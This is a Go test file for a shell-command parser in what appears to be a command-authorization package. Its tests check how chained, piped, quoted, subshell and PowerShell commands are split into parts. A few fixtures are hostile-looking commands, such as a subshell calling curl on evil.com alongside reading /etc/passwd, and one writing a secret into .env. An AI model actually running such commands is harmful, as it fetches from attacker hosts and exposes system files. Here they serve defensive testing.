package authz

import (
	"strings"
	"testing"
)

func TestParseAST_Simple(t *testing.T) {
	pipe, err := ParseAST("git status")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 1 {
		t.Fatalf("expected 1 node, got %d", len(pipe.Nodes))
	}
	n := pipe.Nodes[0]
	if n.Executable != "git" {
		t.Errorf("expected exec 'git', got %q", n.Executable)
	}
	if len(n.Args) != 2 || n.Args[1] != "status" {
		t.Errorf("expected args ['git', 'status'], got %v", n.Args)
	}
}

func TestParseAST_Chained(t *testing.T) {
	cmd := "git status && curl untrusted.site"
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 2 {
		t.Fatalf("expected 2 nodes, got %d", len(pipe.Nodes))
	}

	n0 := pipe.Nodes[0]
	if n0.Executable != "git" || n0.Operator != "&&" {
		t.Errorf("node 0 mismatch: exec=%q, op=%q", n0.Executable, n0.Operator)
	}

	n1 := pipe.Nodes[1]
	if n1.Executable != "curl" || n1.Operator != "" {
		t.Errorf("node 1 mismatch: exec=%q, op=%q", n1.Executable, n1.Operator)
	}
}

func TestParseAST_PipeAndSemicolon(t *testing.T) {
	cmd := "cat file.txt | grep error ; ls -la"
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 3 {
		t.Fatalf("expected 3 nodes, got %d", len(pipe.Nodes))
	}

	if pipe.Nodes[0].Executable != "cat" || pipe.Nodes[0].Operator != "|" {
		t.Errorf("node 0 mismatch: %v", pipe.Nodes[0])
	}
	if pipe.Nodes[1].Executable != "grep" || pipe.Nodes[1].Operator != ";" {
		t.Errorf("node 1 mismatch: %v", pipe.Nodes[1])
	}
	if pipe.Nodes[2].Executable != "ls" || pipe.Nodes[2].Operator != "" {
		t.Errorf("node 2 mismatch: %v", pipe.Nodes[2])
	}
}

func TestParseAST_Quoting(t *testing.T) {
	cmd := `git commit -m "feat: check && do something" 'single quoted & unparsed'`
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 1 {
		t.Fatalf("expected 1 node, got %d", len(pipe.Nodes))
	}
	n := pipe.Nodes[0]
	if len(n.Args) != 5 {
		t.Fatalf("expected 5 args, got %d: %v", len(n.Args), n.Args)
	}
	if n.Args[3] != "feat: check && do something" {
		t.Errorf("arg 3 mismatch: %q", n.Args[3])
	}
	if n.Args[4] != "single quoted & unparsed" {
		t.Errorf("arg 4 mismatch: %q", n.Args[4])
	}
}

func TestParseAST_SubshellExtraction(t *testing.T) {
	cmd := "echo $(curl http://evil.com) `cat /etc/passwd`"
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 1 {
		t.Fatalf("expected 1 root node, got %d", len(pipe.Nodes))
	}
	n := pipe.Nodes[0]
	if len(n.SubCommands) != 2 {
		t.Fatalf("expected 2 subcommands, got %d", len(n.SubCommands))
	}
	if n.SubCommands[0].Executable != "curl" {
		t.Errorf("subcommand 0 exec mismatch: got %q, want 'curl'", n.SubCommands[0].Executable)
	}
	if n.SubCommands[1].Executable != "cat" {
		t.Errorf("subcommand 1 exec mismatch: got %q, want 'cat'", n.SubCommands[1].Executable)
	}
}

func TestParseAST_Redirections(t *testing.T) {
	cmd := "echo secret > .env >> backup.env"
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 1 {
		t.Fatalf("expected 1 node, got %d", len(pipe.Nodes))
	}
	n := pipe.Nodes[0]
	if len(n.Redirections) != 2 {
		t.Fatalf("expected 2 redirections, got %d: %v", len(n.Redirections), n.Redirections)
	}
	if n.Redirections[0].Operator != ">" || n.Redirections[0].Target != ".env" {
		t.Errorf("redir 0 mismatch: %v", n.Redirections[0])
	}
	if n.Redirections[1].Operator != ">>" || n.Redirections[1].Target != "backup.env" {
		t.Errorf("redir 1 mismatch: %v", n.Redirections[1])
	}
}

func TestParseAST_DescriptorRedirections(t *testing.T) {
	cmd := "go test ./... 2>&1 | Select-Object -Last 15"
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 2 {
		t.Fatalf("expected 2 nodes, got %d", len(pipe.Nodes))
	}
	n0 := pipe.Nodes[0]
	if n0.Executable != "go" {
		t.Errorf("node 0 exec mismatch: got %q, want 'go'", n0.Executable)
	}
	if len(n0.Redirections) != 1 || n0.Redirections[0].Operator != "2>&1" {
		t.Errorf("node 0 redir mismatch: %+v", n0.Redirections)
	}
	if n0.Operator != "|" {
		t.Errorf("node 0 operator mismatch: got %q, want '|'", n0.Operator)
	}

	n1 := pipe.Nodes[1]
	if n1.Executable != "Select-Object" {
		t.Errorf("node 1 exec mismatch: got %q, want 'Select-Object'", n1.Executable)
	}
}

func TestParseAST_PowerShellCalculatedProperties(t *testing.T) {
	cmd := `Get-ChildItem -Filter *.exe | Select-Object Name, @{n="Size"; e={[math]::Round($_.Length/1MB,2)}}`
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error parsing calculated property AST: %v", err)
	}
	if len(pipe.Nodes) != 2 {
		t.Fatalf("expected 2 nodes (Get-ChildItem piped to Select-Object), got %d nodes", len(pipe.Nodes))
	}
	if pipe.Nodes[0].Executable != "Get-ChildItem" {
		t.Errorf("expected node 0 exec 'Get-ChildItem', got %q", pipe.Nodes[0].Executable)
	}
	if pipe.Nodes[0].Operator != "|" {
		t.Errorf("expected node 0 operator '|', got %q", pipe.Nodes[0].Operator)
	}
	if pipe.Nodes[1].Executable != "Select-Object" {
		t.Errorf("expected node 1 exec 'Select-Object', got %q", pipe.Nodes[1].Executable)
	}
	fullArgs := strings.Join(pipe.Nodes[1].Args, " ")
	if !strings.Contains(fullArgs, "@{n=\"Size\"; e={[math]::Round($_.Length/1MB,2)}}") &&
		!strings.Contains(fullArgs, `@{n="Size"; e={[math]::Round($_.Length/1MB,2)}}`) {
		t.Errorf("expected calculated property hash table preserved in args, got: %v", pipe.Nodes[1].Args)
	}
}

func TestParseAST_MultipleCalculatedProperties(t *testing.T) {
	cmd := `Get-ChildItem | Select-Object Name, @{n="Size"; e={[math]::Round($_.Length/1MB,2)}}, @{n="Time"; e={$_.LastWriteTime}}`
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 2 {
		t.Fatalf("expected 2 nodes, got %d", len(pipe.Nodes))
	}
	if pipe.Nodes[1].Executable != "Select-Object" {
		t.Errorf("expected node 1 exec 'Select-Object', got %q", pipe.Nodes[1].Executable)
	}
}

func TestParseAST_NestedCalculatedPropertiesWithSemicolon(t *testing.T) {
	cmd := `Get-Process | Select-Object Name, @{n="Details"; e={@{Raw=$_.WS; MB=[math]::Round($_.WS/1MB, 2)}}} ; Get-ChildItem`
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 3 {
		t.Fatalf("expected 3 nodes (Get-Process | Select-Object ; Get-ChildItem), got %d: %+v", len(pipe.Nodes), pipe.Nodes)
	}
	if pipe.Nodes[0].Executable != "Get-Process" {
		t.Errorf("node 0 exec mismatch: got %q, want 'Get-Process'", pipe.Nodes[0].Executable)
	}
	if pipe.Nodes[0].Operator != "|" {
		t.Errorf("node 0 operator mismatch: got %q, want '|'", pipe.Nodes[0].Operator)
	}
	if pipe.Nodes[1].Executable != "Select-Object" {
		t.Errorf("node 1 exec mismatch: got %q, want 'Select-Object'", pipe.Nodes[1].Executable)
	}
	if pipe.Nodes[1].Operator != ";" {
		t.Errorf("node 1 operator mismatch: got %q, want ';'", pipe.Nodes[1].Operator)
	}
	if pipe.Nodes[2].Executable != "Get-ChildItem" {
		t.Errorf("node 2 exec mismatch: got %q, want 'Get-ChildItem'", pipe.Nodes[2].Executable)
	}
}

func TestParseAST_BareStringBanners(t *testing.T) {
	banners := []string{
		"--- EXEs (recursive) ---; Get-ChildItem -Filter *.exe",
		"=== Process List ===; Get-Process",
		"*** Directory Audit ***; dir",
		"[Diagnostic Banner]; git status",
	}

	for _, bCmd := range banners {
		pipe, err := ParseAST(bCmd)
		if err != nil {
			t.Fatalf("unexpected error for banner %q: %v", bCmd, err)
		}
		if len(pipe.Nodes) != 2 {
			t.Fatalf("expected 2 nodes for %q, got %d", bCmd, len(pipe.Nodes))
		}
		if pipe.Nodes[0].Executable != "write-output" {
			t.Errorf("expected banner node 0 to normalize to 'write-output', got %q", pipe.Nodes[0].Executable)
		}
		if pipe.Nodes[0].Operator != ";" {
			t.Errorf("expected operator ';', got %q", pipe.Nodes[0].Operator)
		}
	}
}

func TestParseAST_DotVersionedExecutablePaths(t *testing.T) {
	paths := []struct {
		cmd          string
		expectedExec string
	}{
		{`"C:\hostedtoolcache\windows\Python\3.11.9\x64\python.exe" -m pytest`, "python"},
		{`C:\hostedtoolcache\windows\Python\3.11.9\x64\python.exe -V`, "python"},
		{`"C:\Users\remote\.pyenv\pyenv-win\versions\3.12.1\python.exe" -c "print(1)"`, "python"},
		{`/opt/hostedtoolcache/python/3.11.9/x64/bin/python3 -m unittest`, "python3"},
		{`"D:\tools.v2.0\node.exe" index.js`, "node"},
	}

	for _, tc := range paths {
		pipe, err := ParseAST(tc.cmd)
		if err != nil {
			t.Fatalf("unexpected error for %q: %v", tc.cmd, err)
		}
		if len(pipe.Nodes) == 0 {
			t.Fatalf("expected nodes for %q", tc.cmd)
		}
		if pipe.Nodes[0].Executable != tc.expectedExec {
			t.Errorf("for command %q, expected executable %q, got %q", tc.cmd, tc.expectedExec, pipe.Nodes[0].Executable)
		}
	}
}

